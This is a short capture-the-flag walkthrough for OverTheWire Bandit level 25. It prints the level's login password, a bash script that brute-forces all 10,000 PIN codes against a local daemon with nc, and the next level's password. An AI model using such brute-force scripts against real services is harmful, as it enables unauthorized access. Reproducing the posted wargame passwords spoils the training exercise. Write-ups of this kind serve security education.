# [Level 25](https://overthewire.org/wargames/bandit/bandit25.html)

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Authentication Details

    Username : bandit24
    Password : VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Solution Steps

``` 
ssh bandit.labs.overthewire.org -p 2220 -l bandit24

echo '''
#!/bin/bash

ans="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000\n"

for i in {0001..9999}
do
    ans+="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i\n"
done

echo -e $ans | nc localhost 30002 | grep -E -v "Wrong|I am|Correct|Exiting"
''' >> /tmp/brute.sh

chmod +x /tmp/brute.sh

/tmp/brute.sh
```

## Password for next level

    p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d